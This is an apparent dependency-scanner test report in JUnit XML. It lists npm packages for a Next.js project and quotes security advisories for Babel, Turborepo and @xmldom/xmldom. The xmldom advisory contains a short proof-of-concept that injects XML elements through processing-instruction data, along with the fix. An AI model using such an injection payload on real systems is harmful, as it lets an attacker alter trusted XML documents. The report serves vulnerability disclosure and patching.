<?xml version="1.0" encoding="UTF-8"?><testsuites failures="31" name="dependency-check" tests="128">
          
  <testsuite failures="0" errors="0" time="0" id="0" name="/Users/timothylefkowitz/projects/provenance/package.json?/@ai-sdk/react:^3.0.210" package="@ai-sdk/react:3.0.210" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@ai-sdk/react:3.0.210"/>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="1" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?@babel/core" package="@babel/core" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-4x5r-pxfx-6jf8" name="pkg:npm/%40babel%2Fcore">
                      
      <failure message="cvssV3: LOW, score: 3.200000047683716 (CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N)"/>
                  
      <system-out>## Impact

Using `@babel/core` to compile maliciously crafted code can allow ab attacker to read any source map from the system that is running Babel, if these conditions are _all_ true:
- the attacker controls the input source code
- the attacker can read the output source code
- the attacker knows the path of the source map file that they want to read

**Users that only compile trusted code are not impacted.**

## Patches

The vulnerability has been fixed in `@babel/core@7.29.6` and `@babel/core@8.0.0-rc.6`.

## Workarounds

Callers can mitigate the issue without upgrading by setting [`inputSourceMap: false`](https://babeljs.io/docs/options#inputsourcemap) in their Babel options.

Callers can also manually extract the `#sourceMappingURL` comment from the input source code, validate whether the source map that it links to is allowed to be read, and if it is pass an object to `inputSourceMap` (passing `false` when it's not).

## Credits

Thanks Teodor-Cristian Radoi for reporting the vulnerability.</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?@babel/core, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="2" name="/Users/timothylefkowitz/projects/provenance/package.json?/@dnd-kit/core:^6.3.1" package="@dnd-kit/core:6.3.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@dnd-kit/core:6.3.1"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="3" name="/Users/timothylefkowitz/projects/provenance/package.json?/@dnd-kit/modifiers:^9.0.0" package="@dnd-kit/modifiers:9.0.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@dnd-kit/modifiers:9.0.0"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="4" name="/Users/timothylefkowitz/projects/provenance/package.json?/@dnd-kit/sortable:^10.0.0" package="@dnd-kit/sortable:10.0.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@dnd-kit/sortable:10.0.0"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="5" name="/Users/timothylefkowitz/projects/provenance/package.json?/@dnd-kit/utilities:^3.2.2" package="@dnd-kit/utilities:3.2.2" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@dnd-kit/utilities:3.2.2"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="6" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/apps/web/package.json?/@edge-csrf/nextjs:2.5.3-cloudflare-rc1" package="@edge-csrf/nextjs:2.5.3-cloudflare-rc1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@edge-csrf/nextjs:2.5.3-cloudflare-rc1"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="7" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/apps/web/package.json?/@hookform/resolvers:^5.2.2" package="@hookform/resolvers:5.2.2" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@hookform/resolvers:5.2.2"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="8" name="/Users/timothylefkowitz/projects/provenance/apps/collectibles/package.json?collectibles:0.0.1/@kit/ui:workspace:*" package="@kit/ui:0.1.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@kit/ui:0.1.0"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="9" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/apps/web/package.json?/@makerkit/data-loader-supabase-core:^0.0.10" package="@makerkit/data-loader-supabase-core:0.0.10" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@makerkit/data-loader-supabase-core:0.0.10"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="10" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/apps/web/package.json?/@makerkit/data-loader-supabase-nextjs:^1.2.5" package="@makerkit/data-loader-supabase-nextjs:1.2.5" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@makerkit/data-loader-supabase-nextjs:1.2.5"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="11" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/apps/web/package.json?/@marsidev/react-turnstile:^1.3.1" package="@marsidev/react-turnstile:1.3.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@marsidev/react-turnstile:1.3.1"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="12" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/tooling/eslint/package.json?eslint-config:0.2.0/@next/eslint-plugin-next:15.5.4" package="@next/eslint-plugin-next:15.5.4" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@next/eslint-plugin-next:15.5.4"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="13" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-accordion:1.2.12" package="@radix-ui/react-accordion:1.2.12" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-accordion:1.2.12"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="14" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-alert-dialog:^1.1.15" package="@radix-ui/react-alert-dialog:1.1.15" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-alert-dialog:1.1.15"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="15" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-avatar:^1.1.10" package="@radix-ui/react-avatar:1.1.10" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-avatar:1.1.10"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="16" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-checkbox:^1.3.3" package="@radix-ui/react-checkbox:1.3.3" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-checkbox:1.3.3"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="17" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-collapsible:1.1.12" package="@radix-ui/react-collapsible:1.1.12" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-collapsible:1.1.12"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="18" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-dialog:^1.1.15" package="@radix-ui/react-dialog:1.1.15" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-dialog:1.1.15"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="19" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-dropdown-menu:^2.1.16" package="@radix-ui/react-dropdown-menu:2.1.16" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-dropdown-menu:2.1.16"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="20" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/apps/web/package.json?/@radix-ui/react-icons:^1.3.2" package="@radix-ui/react-icons:1.3.2" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-icons:1.3.2"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="21" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-label:^2.1.7" package="@radix-ui/react-label:2.1.7" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-label:2.1.7"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="22" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-navigation-menu:^1.2.14" package="@radix-ui/react-navigation-menu:1.2.14" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-navigation-menu:1.2.14"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="23" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-popover:^1.1.15" package="@radix-ui/react-popover:1.1.15" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-popover:1.1.15"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="24" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-progress:^1.1.7" package="@radix-ui/react-progress:1.1.7" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-progress:1.1.7"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="25" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-radio-group:^1.3.8" package="@radix-ui/react-radio-group:1.3.8" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-radio-group:1.3.8"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="26" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-scroll-area:^1.2.10" package="@radix-ui/react-scroll-area:1.2.10" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-scroll-area:1.2.10"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="27" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-select:^2.2.6" package="@radix-ui/react-select:2.2.6" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-select:2.2.6"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="28" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-separator:^1.1.7" package="@radix-ui/react-separator:1.1.7" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-separator:1.1.7"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="29" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-slot:^1.2.3" package="@radix-ui/react-slot:1.2.3" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-slot:1.2.3"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="30" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-switch:^1.2.6" package="@radix-ui/react-switch:1.2.6" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-switch:1.2.6"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="31" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-tabs:^1.1.13" package="@radix-ui/react-tabs:1.1.13" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-tabs:1.1.13"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="32" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-toast:^1.2.15" package="@radix-ui/react-toast:1.2.15" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-toast:1.2.15"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="33" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/@radix-ui/react-tooltip:1.2.8" package="@radix-ui/react-tooltip:1.2.8" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@radix-ui/react-tooltip:1.2.8"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="34" name="/Users/timothylefkowitz/projects/provenance/package.json?/@stripe/connect-js:^3.3.5" package="@stripe/connect-js:3.4.6" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@stripe/connect-js:3.4.6"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="35" name="/Users/timothylefkowitz/projects/provenance/package.json?/@stripe/react-connect-js:^3.3.5" package="@stripe/react-connect-js:3.4.4" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@stripe/react-connect-js:3.4.4"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="36" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/supabase/package.json?supabase:0.1.0/@supabase/ssr:^0.7.0" package="@supabase/ssr:0.7.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@supabase/ssr:0.7.0"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="37" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/apps/web/package.json?/@supabase/supabase-js:2.75.0" package="@supabase/supabase-js:2.75.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@supabase/supabase-js:2.75.0"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="38" name="/Users/timothylefkowitz/projects/provenance/package.json?/@tanstack/react-query:5.101.0" package="@tanstack/react-query:5.101.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@tanstack/react-query:5.101.0"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="39" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/apps/web/package.json?/@tanstack/react-query:5.90.2" package="@tanstack/react-query:5.90.2" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@tanstack/react-query:5.90.2"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="40" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/apps/web/package.json?/@tanstack/react-table:^8.21.3" package="@tanstack/react-table:8.21.3" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@tanstack/react-table:8.21.3"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="41" name="/Users/timothylefkowitz/projects/provenance/package.json?/@tiptap/extension-link:^3.27.1" package="@tiptap/extension-link:3.27.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@tiptap/extension-link:3.27.1"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="42" name="/Users/timothylefkowitz/projects/provenance/package.json?/@tiptap/extension-placeholder:^3.27.1" package="@tiptap/extension-placeholder:3.27.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@tiptap/extension-placeholder:3.27.1"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="43" name="/Users/timothylefkowitz/projects/provenance/package.json?/@tiptap/pm:^3.27.1" package="@tiptap/pm:3.27.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@tiptap/pm:3.27.1"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="44" name="/Users/timothylefkowitz/projects/provenance/package.json?/@tiptap/react:^3.27.1" package="@tiptap/react:3.27.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@tiptap/react:3.27.1"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="45" name="/Users/timothylefkowitz/projects/provenance/package.json?/@tiptap/starter-kit:^3.27.1" package="@tiptap/starter-kit:3.27.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@tiptap/starter-kit:3.27.1"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="46" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/tooling/prettier/package.json?prettier-config:0.1.0/@trivago/prettier-plugin-sort-imports:5.2.2" package="@trivago/prettier-plugin-sort-imports:5.2.2" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@trivago/prettier-plugin-sort-imports:5.2.2"/>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="47" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?@turbo/workspaces" package="@turbo/workspaces" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-3qcw-2rhx-2726" name="pkg:npm/%40turbo%2Fworkspaces">
                      
      <failure message="cvssV3: CRITICAL, score: 9.800000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"/>
                  
      <system-out>### Impact  

Turborepo can be vulnerable to arbitrary code execution when run in untrusted repositories that contain malicious Yarn configuration. In affected versions, package manager detection executed `yarn --version` from the project directory, which could cause Yarn to load and execute a project-controlled `yarnPath` from `.yarnrc.yml`. An attacker who controls repository contents could cause code execution when a user or CI system runs affected `turbo`, `@turbo/codemod`, or `@turbo/workspace` conversion commands.

### Fix  

Turbo now avoids executing project-local Yarn during package manager detection. Yarn versions and paths are inferred from metadata such as `package.json`, parsing the value of `yarnPath` in `.yarnrc.yml` rather than executing it, and `yarn.lock`, and unrecognized Yarn lockfile formats are rejected instead of falling back to executing `yarn`.

### Workarounds  

If you cannot upgrade immediately, do not run Turborepo commands in untrusted repositories. Review or remove `.yarnrc.yml` files that define `yarnPath` before running Turborepo, especially in CI or automated tooling that processes external projects.</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?@turbo/workspaces, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="48" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/tooling/eslint/package.json?eslint-config:0.2.0/@types/eslint:9.6.1" package="@types/eslint:9.6.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@types/eslint:9.6.1"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="49" name="/Users/timothylefkowitz/projects/provenance/package.json?/@upstash/ratelimit:^2.0.8" package="@upstash/ratelimit:v2.0.8" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@upstash/ratelimit:v2.0.8"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="50" name="/Users/timothylefkowitz/projects/provenance/package.json?/@upstash/redis:^1.38.0" package="@upstash/redis:1.38.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@upstash/redis:1.38.0"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="51" name="/Users/timothylefkowitz/projects/provenance/package.json?/@vercel/analytics:^1.6.1" package="@vercel/analytics:1.6.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="@vercel/analytics:1.6.1"/>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="52" name="/Users/timothylefkowitz/projects/provenance/pnpm-lock.yaml?@xmldom/xmldom" package="@xmldom/xmldom" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-x6wf-f3px-wcqx" name="pkg:npm/%40xmldom%2Fxmldom">
                      
      <failure message="unscored severity: high"/>
                  
      <system-out>## Summary

The package allows attacker-controlled processing instruction data to be serialized into XML without validating or neutralizing the PI-closing sequence `?&gt;`. As a result, an attacker can terminate the processing instruction early and inject arbitrary XML nodes into the serialized output.

---

## Details

The issue is in the DOM construction and serialization flow for processing instruction nodes.

When `createProcessingInstruction(target, data)` is called, the supplied `data` string is stored directly on the node without validation. Later, when the document is serialized, the serializer writes PI nodes by concatenating `&lt;?`, the target, a space, `node.data`, and `?&gt;` directly.

That behavior is unsafe because processing instructions are a syntax-sensitive context. The closing delimiter `?&gt;` terminates the PI. If attacker-controlled input contains `?&gt;`, the serializer does not preserve it as literal PI content. Instead, it emits output where the remainder of the payload is treated as live XML markup.

The same class of vulnerability was previously addressed for CDATA sections (GHSA-wh4c-j3r5-mjhp / CVE-2026-34601), where `]]&gt;` in CDATA data was handled by splitting. The serializer applies no equivalent protection to processing instruction data.

---

## Affected code

**`lib/dom.js` — `createProcessingInstruction` (lines 2240–2246):**

```js
createProcessingInstruction: function (target, data) {
    var node = new ProcessingInstruction(PDC);
    node.ownerDocument = this;
    node.childNodes = new NodeList();
    node.nodeName = node.target = target;
    node.nodeValue = node.data = data;
    return node;
},
```

No validation is performed on `data`. Any string including `?&gt;` is stored as-is.

**`lib/dom.js` — serializer PI case (line 2966):**

```js
case PROCESSING_INSTRUCTION_NODE:
    return buf.push('&lt;?', node.target, ' ', node.data, '?&gt;');
```

`node.data` is emitted verbatim. If it contains `?&gt;`, that sequence terminates the PI in the output
stream and the remainder appears as active XML markup.

**Contrast — CDATA (line 2945, patched):**

```js
case CDATA_SECTION_NODE:
    return buf.push(g.CDATA_START, node.data.replace(/]]&gt;/g, ']]]]&gt;&lt;![CDATA[&gt;'), g.CDATA_END);
```

---

## PoC

### Minimal (from @tlsbollei report, 2026-04-01)

```js
const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');

const doc = new DOMImplementation().createDocument(null, 'r', null);
doc.documentElement.appendChild(
    doc.createProcessingInstruction('a', '?&gt;&lt;z/&gt;&lt;?q ')
);
console.log(new XMLSerializer().serializeToString(doc));
// &lt;r&gt;&lt;?a ?&gt;&lt;z/&gt;&lt;?q ?&gt;&lt;/r&gt;
//          ^^^^ injected &lt;z/&gt; element is active markup
```

### With re-parse verification (from @tlsbollei report)

```js
const assert = require('assert');
const { DOMParser, XMLSerializer } = require('@xmldom/xmldom');

const doc = new DOMParser().parseFromString('&lt;r/&gt;', 'application/xml');
doc.documentElement.appendChild(doc.createProcessingInstruction('a', '?&gt;&lt;z/&gt;&lt;?q '));
const xml = new XMLSerializer().serializeToString(doc);
assert.strictEqual(new DOMParser().parseFromString(xml, 'application/xml')
    .getElementsByTagName('z').length, 1); // passes — z is a real element
```

---

## Impact

An application that uses the package to build XML from untrusted input can be made to emit attacker-controlled elements outside the intended PI boundary. That allows the attacker to alter the meaning and structure of generated XML documents.

In practice, this can affect any workflow that generates XML and then stores it, forwards it, signs it, or hands it to another parser. Realistic targets include XML-based configuration, policy documents, and message formats where downstream consumers trust the serialized structure.

As noted by @tlsbollei: this is the same delimiter-driven XML injection bug class previously addressed by GHSA-wh4c-j3r5-mjhp for `createCDATASection()`. Fixing CDATA while leaving PI creation and PI serialization unguarded leaves the same standards-constrained issue open for another node type.

---

## Disclosure

This vulnerability was publicly disclosed at 2026-04-06T11:25:07Z via
[xmldom/xmldom#987](https://github.com/xmldom/xmldom/pull/987), which was subsequently closed
without being merged.

---

## Fix Applied

&gt; **⚠ Opt-in required.** Protection is not automatic. Existing serialization calls remain
&gt; vulnerable unless `{ requireWellFormed: true }` is explicitly passed. Applications that pass
&gt; untrusted data to `createProcessingInstruction()` or mutate PI nodes with untrusted input
&gt; (via `.data =` or `CharacterData` mutation methods) should audit all `serializeToString()`
&gt; call sites and add the option.

`XMLSerializer.serializeToString()` now accepts an options object as a second argument. When `{ requireWellFormed: true }` is passed, the serializer throws `InvalidStateError` before emitting any ProcessingInstruction node whose `.data` contains `?&gt;`. This check applies regardless of how `?&gt;` entered the node — whether via `createProcessingInstruction` directly or a subsequent mutation (`.data =`, `CharacterData` methods).

On `@xmldom/xmldom` ≥ 0.9.10, the serializer additionally applies the full W3C DOM Parsing §3.2.1.7 checks when `requireWellFormed: true`:

1. **Target check**: throws `InvalidStateError` if the PI target contains a `:` character or is an ASCII case-insensitive match for `"xml"`.
2. **Data Char check**: throws `InvalidStateError` if the PI data contains characters outside the XML Char production.
3. **Data sequence check**: throws `InvalidStateError` if the PI data contains `?&gt;`.

On `@xmldom/xmldom` ≥ 0.8.13 (LTS), only the `?&gt;` data check (check 3) is applied. The target and XML Char checks are not included in the LTS fix.

### PoC — fixed path

```js
const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');

const doc = new DOMImplementation().createDocument(null, 'r', null);
doc.documentElement.appendChild(doc.createProcessingInstruction('a', '?&gt;&lt;z/&gt;&lt;?q '));

// Default (unchanged): verbatim — injection present
const unsafe = new XMLSerializer().serializeToString(doc);
console.log(unsafe);
// &lt;r&gt;&lt;?a ?&gt;&lt;z/&gt;&lt;?q ?&gt;&lt;/r&gt;

// Opt-in guard: throws InvalidStateError before serializing
try {
  new XMLSerializer().serializeToString(doc, { requireWellFormed: true });
} catch (e) {
  console.log(e.name, e.message);
  // InvalidStateError: The ProcessingInstruction data contains "?&gt;"
}
```

The guard catches `?&gt;` regardless of when it was introduced:

```js
// Post-creation mutation: also caught at serialization time
const pi = doc.createProcessingInstruction('target', 'safe data');
doc.documentElement.appendChild(pi);
pi.data = 'safe?&gt;&lt;injected/&gt;';
new XMLSerializer().serializeToString(doc, { requireWellFormed: true });
// InvalidStateError: The ProcessingInstruction data contains "?&gt;"
```

### Why the default stays verbatim

The W3C DOM Parsing and Serialization spec §3.2.1.3 defines a `require well-formed` flag whose **default value is `false`**. With the flag unset, the spec explicitly permits serializing PI data verbatim. This matches browser behavior: Chrome, Firefox, and Safari all emit `?&gt;` in PI data verbatim by default without error.

Unconditionally throwing would be a behavioral breaking change with no spec justification. The opt-in `requireWellFormed: true` flag allows applications that require injection safety to enable strict mode without breaking existing code.

### Residual limitation

`createProcessingInstruction(target, data)` does not validate `data` at creation time. The WHATWG DOM spec (§4.5 step 2) mandates an `InvalidCharacterError` when `data` contains `?&gt;`; enforcing this check unconditionally at creation time is a breaking change and is deferred to a future breaking release.

When the default serialization path is used (without `requireWellFormed: true`), PI data containing `?&gt;` is still emitted verbatim. Applications that do not pass `requireWellFormed: true` remain exposed.</system-out>
                  
